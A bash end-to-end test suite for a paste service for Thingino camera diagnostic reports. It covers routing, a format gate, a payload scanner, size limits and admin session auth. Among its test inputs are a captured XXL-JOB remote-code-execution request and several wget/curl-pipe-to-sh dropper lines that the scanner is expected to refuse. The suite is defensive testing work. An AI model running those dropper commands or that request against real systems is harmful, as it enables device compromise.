#!/usr/bin/env bash
# End-to-end suite against local `wrangler dev` (miniflare) instances.
# Covers every route, both gates, the D1 storage path, the cron reclaimer and the
# budget limits.
#
#   tests/smoke.sh
#
# Requires node >= 22 on PATH. The gate and shape-scanner logic is unit tested
# separately and much faster:  node tests/unit.mjs

set -u
cd "$(dirname "$0")/.."

# Each wrangler dev costs roughly 400 MB across one node process and two workerd
# children, and killing only the wrangler pid orphans the workerd pair. Leaked
# instances are not harmless: once enough pile up, miniflare's storage services
# start answering 500 and requests hang, which looks exactly like a bug in the
# Worker. So teardown walks the tree, and startup refuses to run beside strays.
kill_tree() {
	local pid="$1" child
	for child in $(pgrep -P "$pid" 2>/dev/null); do
		kill_tree "$child"
	done
	kill -9 "$pid" 2>/dev/null
}

NEXT_PORT="${PORT:-8787}"
PORT=""
BASE=""
# Admin auth is delegated to the image builder, so the suite seeds a session row into
# a local copy of the builder's tables. ADMIN is the raw token; the database stores
# only its SHA-256, exactly as the builder does.
ADMIN="smoke-session-token-0123456789abcdef"
CLIENT="cpe:/o:thinginoproject:thingino:1"
WORK="$(mktemp -d)"
BODY="${WORK}/body"
LOG="${SMOKE_LOG:-${WORK}/wrangler.log}"
PASS=0
FAIL=0
DEV_PID=""

pass() { PASS=$((PASS + 1)); printf '  ok   %s\n' "$1"; }
fail() { FAIL=$((FAIL + 1)); printf '  FAIL %s\n       %s\n' "$1" "$2"; }
peek() { head -c 220 "$BODY" | tr '\n' ' '; }

# check <name> <expected-status> <curl args...>
check() {
	local name="$1" want="$2" got
	shift 2
	: >"$BODY" # so a failed connection cannot show the previous body
	got="$(curl -s -o "$BODY" -w '%{http_code}' "$@")"
	if [ "$got" = "$want" ]; then
		pass "$name ($got)"
	else
		fail "$name" "expected $want, got $got: $(peek)"
	fi
}

body_has() {
	if grep -qi -- "$2" "$BODY"; then pass "$1"; else fail "$1" "pattern '$2' not in body: $(peek)"; fi
}

body_lacks() {
	if grep -qi -- "$2" "$BODY"; then fail "$1" "pattern '$2' WAS in body"; else pass "$1"; fi
}

# Reads one number out of the local builder database, for what no HTTP response reveals. Only
# valid after start_dev, since it needs that instance's persist dir. The value is wrapped in a
# marker because wrangler's --json carries plenty of other numbers (rows_read, duration,
# size_after) that a bare "last field on the line" match would happily return instead.
authdb_num() {
	npx wrangler d1 execute thingino-builder --local --persist-to "$STATE" --json \
		--command "SELECT 'MARK' || ($1) AS m" 2>/dev/null \
		| sed -n 's/.*"MARK\([0-9][0-9]*\)".*/\1/p' | head -1
}

# A report shaped like the one real firmware emits: leading date/uptime/uname, then
# the ===[ THINGINO ]=== block carrying ID=thingino, then further sections.
# The client id is required for every submission now, so the helpers carry it.
CH=(-H "X-Thingino-Client: cpe:/o:thinginoproject:thingino:1")

report() {
	printf '%s\n' \
		'Sun Aug  9 10:26:00 GMT 2026' \
		' 10:26:00 up  2:30,  load average: 1.62, 1.71, 1.71' \
		'Linux ing-smoke-test 3.10.14__isvp_swan_1.0__ #2 PREEMPT mips GNU/Linux' \
		'' '' \
		'===[ THINGINO ]=================================================================' \
		'' '' \
		'NAME=Thingino' \
		'ID=thingino' \
		'VERSION_ID=1' \
		'SOC=t31' \
		'SOC_ARCH=xburst1' \
		'IMAGE_ID=smoke_cam_t31x' \
		'BUILD_ID="master+abc1234, 2026-08-09 07:51:40 +0000"' \
		'' '' \
		'===[ SOC ]======================================================================' \
		'' \
		't31x' \
		'' \
		'===[ ENV ]======================================================================' \
		'' \
		'baudrate=115200' \
		'ethaddr=REDACTED' \
		'' \
		'===[ CMDLINE ]==================================================================' \
		'' \
		'mem=64M console=ttyS1,115200n8 root=/dev/mtdblock3' \
		'' \
		'===[ DMESG ]====================================================================' \
		'' \
		'[    0.000000] Linux version 3.10.14 (thingino@build)' \
		"$1"
}

# Padding that looks like a log. A wall of one repeated character is a 400 KB
# unbroken base64-charset run, which the shape scanner correctly calls a blob, so
# filler has to have the shape of real output.
logfiller() {
	awk -v n="$1" 'BEGIN { for (i = 0; i < n; i++) printf "[%10.6f] kernel: log message number %d, some detail here\n", i / 1000, i }'
}

submit_slug() {
	local name="$1" resp slug
	resp="$(curl -s "${CH[@]}" --data-binary "$2" "${BASE}/")"
	slug="$(printf '%s' "$resp" | head -1 | sed 's|.*/||')"
	if [ ${#slug} -ne 8 ]; then
		fail "$name submit" "no slug in response: $(printf '%s' "$resp" | head -c 200 | tr '\n' ' ')"
		echo ""
		return
	fi
	echo "$slug"
}

start_dev() {
	# A fresh port per instance. wrangler dev spawns workerd as a grandchild, so
	# killing wrangler can leave the old listener holding the port; the next
	# instance then fails to bind while curl happily talks to the previous server
	# with the previous vars, and every override silently appears not to work.
	PORT="$NEXT_PORT"
	NEXT_PORT=$((NEXT_PORT + 1))
	BASE="http://127.0.0.1:${PORT}"

	if curl -s -o /dev/null -m 2 --fail "${BASE}/robots.txt" 2>/dev/null; then
		echo "port ${PORT} is already serving; a stale instance is still up"
		exit 1
	fi

	local th
	# Global, not local: a check needs to read the builder's sessions table back to prove the
	# bin slid `last_active`, which is invisible from any HTTP response.
	STATE="$(mktemp -d "${WORK}/state.XXXXXX")"
	local state="$STATE"

	# Seeded before the server starts, so nothing contends for the SQLite file. Mirrors
	# the builder's schema: sessions.token holds the hex SHA-256 of the bearer token.
	th="$(printf '%s' "$ADMIN" | sha256sum | cut -d' ' -f1)"
	npx wrangler d1 execute thingino-builder --local --persist-to "$state" --command "
	  CREATE TABLE IF NOT EXISTS sessions (token TEXT PRIMARY KEY, admin TEXT, expires INTEGER NOT NULL, last_active INTEGER NOT NULL DEFAULT 0);
	  CREATE TABLE IF NOT EXISTS admins (username TEXT PRIMARY KEY, pw_hash TEXT, totp_secret TEXT, disabled INTEGER NOT NULL DEFAULT 0);
	  INSERT OR REPLACE INTO admins (username, totp_secret, disabled) VALUES ('smoketest', 'x', 0);
	  INSERT OR REPLACE INTO admins (username, totp_secret, disabled) VALUES ('gone', 'x', 1);
	  INSERT OR REPLACE INTO sessions (token, admin, expires, last_active) VALUES ('${th}', 'smoketest', $(( $(date +%s) + 28800 )), $(date +%s));
	  INSERT OR REPLACE INTO sessions (token, admin, expires, last_active) VALUES ('$(printf '%s' expired-token | sha256sum | cut -d' ' -f1)', 'smoketest', $(( $(date +%s) - 10 )), $(date +%s));
	  INSERT OR REPLACE INTO sessions (token, admin, expires, last_active) VALUES ('$(printf '%s' idle-token | sha256sum | cut -d' ' -f1)', 'smoketest', $(( $(date +%s) + 28800 )), $(( $(date +%s) - 9000 )));
	  -- 50 minutes idle: inside the 2h window, and past the 60s throttle, so a request through
	  -- the bin must slide it.
	  INSERT OR REPLACE INTO sessions (token, admin, expires, last_active) VALUES ('$(printf '%s' slide-token | sha256sum | cut -d' ' -f1)', 'smoketest', $(( $(date +%s) + 28800 )), $(( $(date +%s) - 3000 )));
	  INSERT OR REPLACE INTO sessions (token, admin, expires, last_active) VALUES ('$(printf '%s' disabled-token | sha256sum | cut -d' ' -f1)', 'gone', $(( $(date +%s) + 28800 )), $(date +%s));
	  CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY AUTOINCREMENT, ts INTEGER NOT NULL, kind TEXT NOT NULL, build_id TEXT, uid TEXT, ip_bucket TEXT, ip_full TEXT, country TEXT, detail TEXT, app TEXT);
	  INSERT INTO events (ts, kind, ip_bucket, ip_full, country, detail, app) VALUES ($(( $(date +%s) - 60 )), 'admin_login_ok', '203.0.113.0', '203.0.113.7', 'US', 'session created (smoketest)', 'tb');
	  INSERT INTO events (ts, kind, ip_bucket, ip_full, country, detail, app) VALUES ($(( $(date +%s) - 120 )), 'admin_login_fail', '203.0.113.0', '203.0.113.7', 'US', 'bad login (nobody)', 'tb');
	  -- A login through the builder's own page, and one from before the app label existed. Neither
	  -- belongs on this bin's page.
	  INSERT INTO events (ts, kind, ip_bucket, ip_full, country, detail, app) VALUES ($(( $(date +%s) - 140 )), 'admin_login_ok', '198.51.100.0', '198.51.100.4', 'US', 'session created (elsewhere)', 'builder');
	  INSERT INTO events (ts, kind, ip_bucket, ip_full, country, detail, app) VALUES ($(( $(date +%s) - 160 )), 'admin_login_ok', '198.51.100.0', '198.51.100.5', 'US', 'session created (unlabelled)', NULL);
	  INSERT INTO events (ts, kind, ip_bucket, ip_full, country, detail, app) VALUES ($(( $(date +%s) - 180 )), 'queued', NULL, NULL, NULL, 'some build, not a login', NULL);
	" >/dev/null 2>&1 || { echo "could not seed the auth database"; exit 1; }

	# PORTAL_UPSTREAM cleared first: wrangler dev reads wrangler.toml, where it points at the
	# live Pages site, and a suite that reaches github.io is neither hermetic nor fast. Proxying
	# is covered by tests/web.sh against a local stand-in; here only the route wiring matters.
	# A later --var of the same name in "$@" still wins.
	npx wrangler dev --port "$PORT" --persist-to "$state" --var PORTAL_UPSTREAM: "$@" >"$LOG" 2>&1 &
	DEV_PID=$!
	curl -s -o /dev/null -m 5 --retry 60 --retry-delay 1 --retry-connrefused "${BASE}/robots.txt" || {
		echo "wrangler dev never came up on port ${PORT}. log:"; tail -20 "$LOG"; exit 1
	}

	# The listener answers before D1 and the Durable Object are ready, and an early
	# request against either returns 500 rather than an honest answer.
	local tries=0
	until [ "$(curl -s -o /dev/null -m 5 -w '%{http_code}' "${BASE}/aaaaaaaaaaaaa")" = "404" ]; do
		tries=$((tries + 1))
		if [ "$tries" -gt 30 ]; then
			echo "storage never became ready on port ${PORT}. log:"; tail -20 "$LOG"; exit 1
		fi
		curl -s -o /dev/null -m 2 "${BASE}/robots.txt" >/dev/null 2>&1
	done
}

stop_dev() {
	[ -n "$DEV_PID" ] || return 0
	kill_tree "$DEV_PID"
	wait "$DEV_PID" 2>/dev/null
	DEV_PID=""
	local tries=0
	while curl -s -o /dev/null -m 1 --fail "${BASE}/robots.txt" 2>/dev/null; do
		tries=$((tries + 1))
		[ "$tries" -gt 30 ] && break
	done
}

cleanup() { stop_dev; rm -rf "$WORK"; }
trap cleanup EXIT

STRAYS="$(pgrep -c -f '[w]orkerd-linux-64' 2>/dev/null || true)"
STRAYS="${STRAYS:-0}"
if [ "$STRAYS" -gt 0 ]; then
	echo "warning: ${STRAYS} stray workerd process(es) already running, killing them first"
	for stray in $(pgrep -f '[w]orkerd-linux-64' 2>/dev/null); do kill -9 "$stray" 2>/dev/null; done
	for stray in $(pgrep -f '[w]rangler dev --port' 2>/dev/null); do kill -9 "$stray" 2>/dev/null; done
fi

echo "== main instance (defaults) =="
start_dev

echo "-- routing and static"
check "GET / says nothing" 404 "${BASE}/"
body_lacks "root reveals nothing about the service" "thingino"
check "GET /robots.txt" 200 "${BASE}/robots.txt"
body_has "robots disallows all" "Disallow: /"
check "GET unknown 13-char slug" 404 "${BASE}/abcdefghjkmnp"
check "GET malformed slug" 404 "${BASE}/nope"
check "slug with excluded letters rejected" 404 "${BASE}/iiiiiiiiiiiii"
check "unknown subpath" 404 -X PUT "${BASE}/abcdefghjkmnp/x"
check "PATCH on slug rejected" 405 -X PATCH "${BASE}/abcdefghjkmnp"

echo "-- gate: only thingino diag reports"
check "plain text rejected" 422 --data-binary "just some logs" "${BASE}/"
body_lacks "refusal does not name the format" "===\[ THINGINO"
check "marker without ID=thingino rejected" 422 --data-binary "$(printf '===[ THINGINO ]===\nID=notthingino\n')" "${BASE}/"
check "ID line without the marker rejected" 422 --data-binary "$(printf 'ID=thingino\nSOC=t31\n')" "${BASE}/"
check "empty body" 400 --data-binary "" "${BASE}/"
check "real-shaped report accepted" 201 "${CH[@]}" --data-binary "$(report 'nothing sensitive')" "${BASE}/"

echo "-- payload rejection (gate 2: shape)"
# The real artifact recovered from the old fiche service: a 670 byte plaintext
# XXL-JOB /run RCE POST carrying a wget|sh dropper. Gate 1 alone refuses it.
check "the real C2 artifact from the old bin" 422 --data-binary 'POST /run HTTP/1.1
Host: 192.0.2.10:9999
XXL-JOB-ACCESS-TOKEN: default_token
Content-Type: application/json

{"glueType":"GLUE_SHELL","glueSource":"(wget -qO- http://45.92.1.50/rondo.aqg.sh||curl -s http://45.92.1.50/rondo.aqg.sh)|sh&"}' "${BASE}/"
body_has "refusal is opaque" "not accepted"
[ "$(wc -l < "$BODY")" = "1" ] && pass "refusal is a single line" || fail "refusal is a single line" "$(wc -l < "$BODY") lines"

# Same dropper, this time wrapped in a valid envelope so it reaches gate 2.
check "dropper wrapped in a valid envelope" 422 "${CH[@]}" --data-binary "$(report '(wget -qO- http://45.92.1.50/rondo.aqg.sh)|sh&')" "${BASE}/"
body_lacks "refusal does not name the check (dropper_chain)" "dropper_chain"

check "base64 PE header" 422 "${CH[@]}" --data-binary "$(report 'TVqQAAMAAAAEAAAA//8AALgAAAA')" "${BASE}/"
body_lacks "refusal does not name the check (executable_image)" "executable_image"
check "base64 ELF header" 422 "${CH[@]}" --data-binary "$(report 'f0VMRgIBAQAAAAAAAAAAAAIAPgA')" "${BASE}/"
body_lacks "refusal does not name the check (executable_image for elf)" "executable_image"

# 64 KB of base64, wrapped at 64 columns like PEM. Defeats a token-length check,
# caught by the ratio.
{ report 'payload follows'; head -c 48000 /dev/urandom | base64 -w 64; } >"${WORK}/blob"
check "wrapped base64 blob" 422 "${CH[@]}" --data-binary "@${WORK}/blob" "${BASE}/"
body_lacks "refusal does not name the check (encoded_blob)" "encoded_blob"

# Same payload on one enormous line. Defeats a line-run check, caught by the ratio.
{ report 'payload follows'; head -c 48000 /dev/urandom | base64 -w 0; } >"${WORK}/blob1"
check "unwrapped base64 blob" 422 "${CH[@]}" --data-binary "@${WORK}/blob1" "${BASE}/"
body_lacks "refusal does not name the check (encoded_blob for one-liner)" "encoded_blob"

# A SMALL wrapped blob buried in a large log: too little to move the ratio, caught
# by the consecutive-base64-line run. This is why both checks exist.
{ report 'log follows'
  for i in $(seq 1 4000); do echo "[   $i.000000] kernel log line number $i here"; done
  head -c 3000 /dev/urandom | base64 -w 64
  for i in $(seq 1 4000); do echo "[   $i.000000] more kernel log line $i"; done
} >"${WORK}/blob2"
check "small blob hidden in a big log" 422 "${CH[@]}" --data-binary "@${WORK}/blob2" "${BASE}/"
body_lacks "refusal does not name the check (encoded_block)" "encoded_block"

# A hand-made wrapper with junk section names. Four of them used to clear a bare count of
# four; requiring RECOGNISED names refuses it, which is the one place the gate got stricter
# while everything else was relaxed for real reports.
{ printf '%s\n' 'x' '===[ THINGINO ]===' 'NAME=Thingino' 'ID=thingino' 'SOC=t31' \
	'===[ zzz ]===' '===[ yyy ]===' '===[ xxx ]===' 'payload goes here'; } >"${WORK}/fake"
check "envelope with junk section names" 422 "${CH[@]}" --data-binary "@${WORK}/fake" "${BASE}/"
body_lacks "refusal does not name the check (no_known_sections)" "no_known_sections"

# The other side of that change: reports from real devices vary enormously in which
# sections survive, because the producing tool emits a header only when its command made
# output. Measured in the lab: 30 sections on a T31X, 24 on a T40N, 23 on a T21N, 5 when
# only the unconditional headers make it. The floor case must be accepted.
{ printf '%s\n' 'Sun Aug  9 10:26:00 GMT 2026' \
	'===[ THINGINO ]===' 'NAME=Thingino' 'ID=thingino' 'SOC=t31' \
	'===[ ENV ]===' 'baudrate=115200' \
	'===[ KMOD-2 ]===' '== /etc/modules.d/10-sensor ==' \
	'===[ streamer ]===' '[rtsp]' 'port = 554' \
	'===[ WPA-CONF ]===' 'ctrl_interface=/var/run/wpa_supplicant'; } >"${WORK}/floor"
check "degraded device, only unconditional sections" 201 "${CH[@]}" --data-binary "@${WORK}/floor" "${BASE}/"

# A mount line as the kernel prints it over IPv6: the literal address lands in mountaddr=
# and addr=, and that single token reached 90% of the old 384 limit.
{ report 'mounts follow'
  printf '[2001:470:1f0b:1234::1]:/export on /mnt/nfs type nfs %s\n' \
    '(rw,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp6,timeo=600,retrans=2,sec=krb5p,mountaddr=2001:470:1f0b:1234:2a05:d014:abcd:1234,mountvers=3,mountproto=tcp6,local_lock=none,addr=2001:470:1f0b:1234:2a05:d014:abcd:1234,clientaddr=2001:470:1f0b:1234:2a05:d014:abcd:5678,lookupcache=all,nconnect=4)'
} >"${WORK}/nfs6"
check "NFSv4 over IPv6 mount options" 201 "${CH[@]}" --data-binary "@${WORK}/nfs6" "${BASE}/"

# A base64 payload chunked below the old 40-character run threshold. This was ACCEPTED before
# the ratio started counting tokens: run length is the one thing an attacker sets for free.
{ report 'payload follows'
  head -c 48000 /dev/urandom | base64 -w 0 | fold -w 39 | awk '{printf "[  %d.000000] data %s\n", NR, $0}'
} >"${WORK}/chunk39"
check "base64 chunked at 39 characters" 422 "${CH[@]}" --data-binary "@${WORK}/chunk39" "${BASE}/"
body_lacks "refusal does not name the check (chunked blob)" "encoded_blob"

# The other direction: content that is mostly long hash tokens must be accepted. A sha256sum
# listing measured 79% under the run rule and was refused.
{ report 'checksums follow'
  for i in $(seq 1 40); do printf '%s  /usr/bin/tool%d\n' "$(head -c 32 /dev/urandom | od -An -tx1 | tr -d ' \n')" "$i"; done
} >"${WORK}/sums"
check "a sha256sum listing" 201 "${CH[@]}" --data-binary "@${WORK}/sums" "${BASE}/"

# An ELF with a single byte in front of it. The old alignment-0-only signature list was
# defeated by exactly this, and the ratio would not have caught a small one.
{ report 'attachment follows'; (printf 'X'; head -c 600 /bin/busybox 2>/dev/null || head -c 600 /bin/sh) | base64 -w 76; } >"${WORK}/elf1"
check "an ELF base64ed with a one-byte prefix" 422 "${CH[@]}" --data-binary "@${WORK}/elf1" "${BASE}/"
body_lacks "refusal does not name the check (executable)" "executable_image"

# Loader chains the original wget|sh pattern missed.
for spec in "busybox-piped:busybox wget -qO- http://1.2.3.4/x | busybox sh" \
            "fetch-then-chmod:wget http://1.2.3.4/x -O /tmp/x; chmod 777 /tmp/x; /tmp/x" \
            "decode-then-run:echo QUFB | base64 -d | sh" \
            "per-arch-binary:wget http://45.92.1.50/mips"; do
	report "${spec#*:}" >"${WORK}/loader"
	check "loader: ${spec%%:*}" 422 "${CH[@]}" --data-binary "@${WORK}/loader" "${BASE}/"
done
# And a mirror URL that merely ends in an arch name must not fire.
report 'wget https://mirror.example.org/debian/pool/main/x86_64/foo.deb' >"${WORK}/mirror"
check "a mirror url ending in an arch name is fine" 201 "${CH[@]}" --data-binary "@${WORK}/mirror" "${BASE}/"

# WIFI-SCAN prints wpa_cli scan_results verbatim, and accented or emoji SSIDs are ordinary.
# Counting only bytes 0x20-0x7e made all of it read as binary.
{ report 'scan follows'
  for i in $(seq 1 400); do
    printf '00:11:22:33:44:%02x\t2437\t-50\t[WPA2-PSK-CCMP][ESS]\tCafé ☕ Zuhause—%d\n' "$((i % 256))" "$i"
  done
} >"${WORK}/ssids"
check "non-ASCII SSIDs in a wifi scan" 201 "${CH[@]}" --data-binary "@${WORK}/ssids" "${BASE}/"

check "raw binary content" 422 "${CH[@]}" --data-binary "$(report "$(head -c 4000 /dev/urandom | tr -d '\n')")" "${BASE}/"
body_has "refusal is opaque for binary too" "not accepted"

# A bare envelope with too little structure to be a real report.
check "envelope with too few sections" 422 --data-binary "$(printf '===[ THINGINO ]===\nID=thingino\nSOC=t31\n\npayload here\n')" "${BASE}/"
body_lacks "refusal does not name the check (too_few_sections)" "too_few_sections"

check "rejection does not echo the payload back" 422 "${CH[@]}" --data-binary "$(report 'canarypayloadvalue (wget -qO- http://x/y)|sh')" "${BASE}/"
body_lacks "payload not echoed" "canarypayloadvalue"

echo "-- a clean report is not disturbed"
check "clean report still accepted" 201 "${CH[@]}" --data-binary "$(report 'nothing unusual here')" "${BASE}/"
rm -f "${WORK}/blob" "${WORK}/blob1" "${WORK}/blob2"

echo "-- the client-token door: arbitrary command output"
OUT="$(printf '[    0.000000] Linux version 3.10.14\n[    0.120000] Memory: 61234K available\nsome program output\n')"
check "arbitrary output with no token" 422 --data-binary "$OUT" "${BASE}/"
body_lacks "refusal does not hint at the header" "X-Thingino-Client"
check "arbitrary output with a wrong client id" 422 --data-binary "$OUT" -H "X-Thingino-Client: nope" "${BASE}/"
check "a near-miss prefix is refused" 422 --data-binary "$OUT" -H "X-Thingino-Client: cpe:/o:thinginoproject:thingamo" "${BASE}/"
check "a future version bump still works" 201 --data-binary "$OUT" -H "X-Thingino-Client: cpe:/o:thinginoproject:thingino:9" "${BASE}/"
check "arbitrary output with the token" 201 --data-binary "$OUT" -H "X-Thingino-Client: ${CLIENT}" "${BASE}/"
body_has "paste gets the 1 day ttl" "(1 day)"
check "diag report needs no token" 201 "${CH[@]}" --data-binary "$(report 'x')" "${BASE}/"
body_has "diag keeps the 3 day ttl" "(3 days)"
# The shape gate is content-agnostic and applies to both doors.
check "dropper with a valid token still refused" 422 --data-binary "$(printf 'output\n(wget -qO- http://45.92.1.50/x.sh)|sh&\n')" -H "X-Thingino-Client: ${CLIENT}" "${BASE}/"
body_lacks "token door refusal is opaque too" "dropper_chain"
{ printf 'output follows\n'; head -c 48000 /dev/urandom | base64 -w 64; } >"${WORK}/tokblob"
check "blob with a valid token still refused" 422 "${CH[@]}" --data-binary "@${WORK}/tokblob" -H "X-Thingino-Client: ${CLIENT}" "${BASE}/"
body_lacks "token door blob refusal is opaque" "encoded_blob"
check "executable with a valid token still refused" 422 --data-binary "$(printf 'out\nTVqQAAMAAAAEAAAA//8AALgAAAA\n')" -H "X-Thingino-Client: ${CLIENT}" "${BASE}/"
# Section count is meaningless for command output, so it must not be applied there.
check "two-line output is not judged on sections" 201 --data-binary "$(printf 'total 4\ndrwxr-xr-x 2 root root 4096 Aug  9 12:00 .\n')" -H "X-Thingino-Client: ${CLIENT}" "${BASE}/"
check "json reports the kind" 201 -H "Accept: application/json" -H "X-Thingino-Client: ${CLIENT}" --data-binary "$OUT" "${BASE}/"
body_has "kind is paste" '"kind": "paste"'
rm -f "${WORK}/tokblob"

echo "-- size cap"
{ report ""; head -c 1200000 /dev/zero | tr '\0' 'x'; } >"${WORK}/big"
check "oversized body" 413 "${CH[@]}" --data-binary "@${WORK}/big" "${BASE}/"
body_has "413 advises device-side trim" "Trim it on the device"
check "server healthy after oversized upload" 200 "${BASE}/robots.txt"
{ report ""; head -c 9000000 /dev/zero | tr '\0' 'y'; } >"${WORK}/huge"
check "body many times the cap" 413 "${CH[@]}" --data-binary "@${WORK}/huge" "${BASE}/"
check "server healthy after huge upload" 200 "${BASE}/robots.txt"
check "submit still works after huge upload" 201 "${CH[@]}" --data-binary "$(report 'after huge')" "${BASE}/"
rm -f "${WORK}/big" "${WORK}/huge"

echo "-- a realistically sized report (430 KiB, like the real thing)"
{ report 'padding follows'; logfiller 7000; } >"${WORK}/real"
check "430 KiB report accepted" 201 "${CH[@]}" --data-binary "@${WORK}/real" "${BASE}/"
RSLUG="$(grep -o 'http://[^ ]*' "$BODY" | head -1 | sed 's|.*/||')"
curl -s "${BASE}/${RSLUG}" -o "${WORK}/roundtrip"
if cmp -s "${WORK}/real" "${WORK}/roundtrip"; then
	pass "430 KiB blob round-trips byte for byte"
else
	fail "430 KiB blob round-trips byte for byte" "stored $(wc -c <"${WORK}/real") vs read $(wc -c <"${WORK}/roundtrip")"
fi
rm -f "${WORK}/real" "${WORK}/roundtrip"

echo "-- happy path"
SLUG="$(submit_slug happy "$(report 'sensor: sc2336
free: 41234 kB')")"
RESP="$(curl -s "${CH[@]}" --data-binary "$(report 'token probe')" "${BASE}/")"
TOKEN="$(printf '%s' "$RESP" | grep -o "X-Delete-Token: [a-z0-9]*" | awk '{print $2}')"
TSLUG="$(printf '%s' "$RESP" | head -1 | sed 's|.*/||')"
[ ${#SLUG} -eq 8 ] && pass "slug is 8 chars ($SLUG)" || fail "slug length" "got '$SLUG'"
[ ${#TOKEN} -eq 26 ] && pass "delete token is 26 chars" || fail "token length" "got '$TOKEN'"
printf '%s' "$RESP" | head -1 | grep -qE "^http://127.0.0.1:${PORT}/[0-9a-z]{8}$" && pass "line 1 is the bare url" || fail "line 1 is the bare url" "$(printf '%s' "$RESP" | head -1)"
printf '%s' "$RESP" | grep -q "expires: 20" && pass "response states expiry" || fail "response states expiry" "$RESP"
printf '%s' "$RESP" | grep -q "NOTE" && fail "response carries no extra notes" "note present" || pass "response carries no extra notes"

check "GET the paste" 200 "${BASE}/${SLUG}"
body_has "body round-trips" "sensor: sc2336"
body_has "report preserved verbatim" "ID=thingino"
check "HEAD the paste" 200 -I "${BASE}/${SLUG}"
# The HEAD query selects `size` specifically, and for a while dropped it again, so a HEAD
# answered with no length and told a caller nothing a GET would not. With a null body the
# runtime cannot derive it, so it has to be set explicitly.
HLEN="$(curl -s -D - -o /dev/null -I "${BASE}/${SLUG}" | sed -n 's/^[Cc]ontent-[Ll]ength: *\([0-9]*\).*/\1/p' | tail -1)"
GLEN="$(curl -s -D - -o /dev/null "${BASE}/${SLUG}" | sed -n 's/^[Cc]ontent-[Ll]ength: *\([0-9]*\).*/\1/p' | tail -1)"
[ -n "$HLEN" ] && [ "$HLEN" = "$GLEN" ] && pass "HEAD reports the same length as GET ($HLEN)" \
	|| fail "HEAD reports the same length as GET" "HEAD gave '$HLEN', GET gave '$GLEN'"

echo "-- inert headers"
HDRS="$(curl -s -D - -o /dev/null "${BASE}/${SLUG}")"
for want in "content-type: text/plain" "x-content-type-options: nosniff" "x-robots-tag: noindex" "cache-control: no-store" "content-security-policy: default-src" "referrer-policy: no-referrer" "x-thingino-expires: 20"; do
	printf '%s' "$HDRS" | grep -qi "$want" && pass "header $want" || fail "header $want" "$(printf '%s' "$HDRS" | tr '\n' '|')"
done
printf '%s' "$HDRS" | grep -qi "content-disposition" && fail "no attachment disposition" "content-disposition present" || pass "no attachment disposition"

echo "-- json submit"
check "json submit" 201 -H "Accept: application/json" "${CH[@]}" --data-binary "$(report 'json probe')" "${BASE}/"
body_has "json has url" '"url"'
body_has "json has delete_token" '"delete_token"'
body_has "json has expires" '"expires"'

echo "-- event log (admin only, outlives the report)"
ABSLUG="$(submit_slug abuse "$(report 'abuse record test')")"
check "event log needs admin" 404 "${BASE}/admin/events"
check "event log with wrong key" 404 -H "Authorization: Bearer wrong" "${BASE}/admin/events"
check "event log by slug" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?slug=${ABSLUG}"
body_has "record has the slug" "${ABSLUG}"
body_has "record has an ip field" '"ip"'
# Present as a key even where the edge supplies no value, so the portal can decide to show a
# flag or nothing without guessing.
body_has "record carries the origin country" '"country"'
body_has "record states its retention" '"retention_days"'
body_has "record expiry is a date" '"record_expires"'
# A submission is one event kind among several now, and the detail is what makes the log
# readable next to an admin action rather than a bare list of addresses.
body_has "the row is a submit event" '"kind": "submit"'
body_has "and names the report kind and size" '"detail": "diag,'
check "event log lists recent" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?limit=5"
body_has "listing has a count" '"count"'
body_has "and the total behind it" '"total"'
# Logins happen at the builder, so they are read from its table rather than invented here.
check "the log carries builder logins" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?limit=50"
body_has "a successful login shows up" '"kind": "admin_login_ok"'
body_has "with the identity lifted into the admin column" '"admin": "smoketest"'
body_has "a failed one does too" '"kind": "admin_login_fail"'
# The attempted username in a failed login's detail is not an identity and must not be shown as
# one, or a stranger typing "master" would appear to be master.
body_lacks "but a failed login names nobody as the admin" '"admin": "nobody"'
# Only the login kinds cross over. The builder's build traffic is its own page's business.
body_lacks "and no other builder event leaks in" '"kind": "queued"'
# Scoped to this bin's own sign-in page: a login through the builder's page, or one from before
# the app label existed, is the builder's business and not shown here.
body_lacks "a login through the builder's page stays there" 'session created (elsewhere)'
body_lacks "and an unlabelled one is not assumed to be ours" 'session created (unlabelled)'
# The total is counted under the same filter as the rows, or "the latest 5 of N" would count
# rows the filter excluded. One submission by this address, so a filtered total of 1.
check "filtered total counts only the match" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/events?slug=${ABSLUG}"
body_has "filtered total is the filtered count" '"total": 1'
check "unknown admin subpath 404s" 404 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/nonsense"
check "admin endpoints reject non-GET" 404 -X POST -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"

echo "-- delegated auth (sessions live in the builder's database)"
check "valid builder session is accepted" 200 -H "Authorization: Bearer ${ADMIN}" "${BASE}/admin/stats"
check "no session" 404 "${BASE}/admin/stats"
check "unknown session" 404 -H "Authorization: Bearer nope" "${BASE}/admin/stats"
check "expired session" 404 -H "Authorization: Bearer expired-token" "${BASE}/admin/stats"
check "idle-timed-out session" 404 -H "Authorization: Bearer idle-token" "${BASE}/admin/stats"
# The bin slides `last_active`, the one write it makes to the builder's database. Nothing in an
# HTTP response shows it, so read the row back. Without this a session used only against the bin
# died a fixed 2h after login however hard it was being used.
SLIDE_H="$(printf '%s' slide-token | sha256sum | cut -d' ' -f1)"
SLIDE_BEFORE="$(authdb_num "SELECT last_active FROM sessions WHERE token='${SLIDE_H}'")"
check "a 50-minute-idle session still works" 200 -H "Authorization: Bearer slide-token" "${BASE}/admin/stats"
SLIDE_AFTER="$(authdb_num "SELECT last_active FROM sessions WHERE token='${SLIDE_H}'")"
if [ -n "$SLIDE_BEFORE" ] && [ -n "$SLIDE_AFTER" ] && [ "$SLIDE_AFTER" -gt "$SLIDE_BEFORE" ]; then
	pass "using the bin slides the idle window (${SLIDE_BEFORE} -> ${SLIDE_AFTER})"
else
	fail "using the bin slides the idle window" "last_active ${SLIDE_BEFORE:-?} -> ${SLIDE_AFTER:-?}"
fi
# The slide is last in the function, after every check, so a session already past its window
# cannot revive itself by being used.
IDLE_H="$(printf '%s' idle-token | sha256sum | cut -d' ' -f1)"
IDLE_BEFORE="$(authdb_num "SELECT last_active FROM sessions WHERE token='${IDLE_H}'")"
check "the idle one is still refused" 404 -H "Authorization: Bearer idle-token" "${BASE}/admin/stats"
